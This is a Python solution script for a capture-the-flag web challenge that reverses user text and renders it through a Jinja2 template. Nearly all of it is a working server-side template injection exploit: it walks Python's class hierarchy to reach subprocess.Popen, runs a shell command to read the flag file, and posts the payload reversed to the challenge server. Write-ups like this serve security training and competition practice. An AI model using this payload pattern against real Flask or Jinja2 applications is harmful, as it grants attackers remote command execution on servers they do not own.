'''
An extremely useful tool. Hope there aren't issues with the server-side templating...

reverser.mc.ax

The flag is in a file with an unknown name
'''

import requests
import re

# Solution
# Seems like this is goina be about template injection
# Using the references below, was able to grab the subclass popen, then execute that to get some RCE

# References
# This blog post pretty much broke things down really well
# https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

def main():
  val = '{{ "".__class__.__mro__[1].__subclasses__()[273]("cat flag-f5953883-3dae-4a0f-9660-d00b50ff4012.txt", shell=True, stdout=-1).communicate() }}'
  resp = requests.post('https://reverser.mc.ax/',{'text': val[::-1]})

  flag_match = r'hope{.*}'
  flag = re.search(flag_match, resp.text)[0]
  print(flag)

if __name__ == '__main__':
  main()
